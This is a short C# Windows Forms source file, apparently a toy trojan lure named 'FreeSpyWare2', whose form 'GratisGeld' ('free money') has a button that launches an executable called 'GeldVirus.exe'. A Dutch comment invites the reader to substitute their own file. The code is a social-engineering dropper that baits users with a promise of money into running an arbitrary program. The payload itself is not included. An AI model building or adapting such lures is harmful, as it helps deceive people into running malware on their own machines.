using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace FreeSpyWare2
{
    public partial class GratisGeld : Form
    {
        public GratisGeld()
        {
            InitializeComponent();
        }

        private void Titel_Click(object sender, EventArgs e)
        {

        }

        private void TextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Button_Click(object sender, EventArgs e)
        {
            //Pas dit aan naar jouw eigen file.
            string file = @"GeldVirus.exe";
            Process.Start(file);
            this.Close();
        }

        private void GratisGeld_Load(object sender, EventArgs e)
        {

        }
    }
}
